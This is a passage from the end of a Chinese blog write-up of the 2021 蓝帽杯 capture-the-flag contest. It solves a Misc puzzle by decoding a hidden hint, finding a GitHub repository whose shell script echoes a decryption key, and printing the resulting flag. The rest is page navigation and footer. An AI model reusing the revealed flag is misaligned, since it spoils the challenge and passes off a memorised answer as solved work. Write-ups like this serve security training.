+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A︎G︎i︎t︎H︎u︎b︎r︎e︎p︎o︎s︎i︎t︎o︎r︎y︎n︎a︎m︎e︎d︎1︎c︎e︎P︎e︎a︎🙵i︎s︎v︎e︎r︎y︎i︎n︎t︎e︎r︎e︎s︎t︎i︎n︎g︎.︎W︎h︎y︎n︎o︎t︎t︎a︎🙵e︎a︎l︎o︎o︎🙵a︎t︎i︎t︎?︎</span><br></pre></td></tr></table></figure>
+
+<p>在 GitHub 上搜寻 1cePeak 可以找到一个 repository，在其文件中可以找到如下关键内容。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line"></span><br><span class="line">echo How_6ad_c0uld_a_1cePeak_be? &gt;&amp;2</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>How_6ad_c0uld_a_1cePeak_be?</code> 作为 key 解密 emoji-aes 的密文可以得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e32f619b-dbcd-49bd-9126-5d841aa01767&#125;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ball-sigin"><span class="toc-number">1.1.</span> <span class="toc-text">Ball_sigin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#one-Pointer-php"><span class="toc-number">1.2.</span> <span class="toc-text">one_Pointer_php</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP-INT-MAX-%E5%AF%BC%E8%87%B4%E8%B5%8B%E5%80%BC%E6%8A%A5%E9%94%99"><span class="toc-number">1.2.1.</span> <span class="toc-text">PHP_INT_MAX 导致赋值报错</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FTP-SSRF-%E6%94%BB%E5%87%BB-PHP-FPM-FastCGI"><span class="toc-number">1.2.2.</span> <span class="toc-text">FTP SSRF 攻击 PHP-FPM&#x2F;FastCGI</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%AC%E5%A5%A5%E4%BC%9A-is-coming"><span class="toc-number">2.1.</span> <span class="toc-text">冬奥会_is_coming</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-CN/posts/e43fbefd.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-CN/posts/e43fbefd.html&text=蓝帽杯 2021"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-CN/posts/e43fbefd.html&title=蓝帽杯 2021"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-CN/posts/e43fbefd.html&is_video=false&description=蓝帽杯 2021"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=蓝帽杯 2021&body=Check out this article: https://lemonprefect.cn/zh-CN/posts/e43fbefd.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-CN/posts/e43fbefd.html&title=蓝帽杯 2021"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-CN/posts/e43fbefd.html&title=蓝帽杯 2021"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-CN/posts/e43fbefd.html&title=蓝帽杯 2021"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-CN/posts/e43fbefd.html&title=蓝帽杯 2021"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-CN/posts/e43fbefd.html&name=蓝帽杯 2021&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-CN/posts/e43fbefd.html&t=蓝帽杯 2021"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+        
+        
+        <li>
+        
+          <a href="#">简</a>
+        
+          <a href="/en">En</a>
+        
+          <a href="/zh-TW">正</a>
+        
+        </li>
+      </ul>
+    </nav>
+  </div>
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2021
+    LemonPrefect
+    
+      <a target="_blank" rel="noopener" href="http://beian.miit.gov.cn/">湘ICP备20002800号</a>
+    
+    
+      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="/images/beian.png"/>
+      <a href= "http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=43021102000188">湘公网安备43021102000188号</a>
+    
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+<script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 2,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(i){i.imageLazyLoadSetting.processImages=a;var n=i.imageLazyLoadSetting.isSPA,o=i.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function a(){n&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,e,a=0;a<r.length;a++)t=r[a],e=void 0,0<=(e=t.getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(i.innerHeight*o||document.documentElement.clientHeight*o)&&function(){var t,e,i,n,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},i=new Image,n=t.getAttribute("data-original"),i.onload=function(){t.src=n,e&&e()},t.src!==n&&(i.src=n)}()}a(),i.addEventListener("scroll",function(){var t,e;t=a,e=i,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body>
+</html>
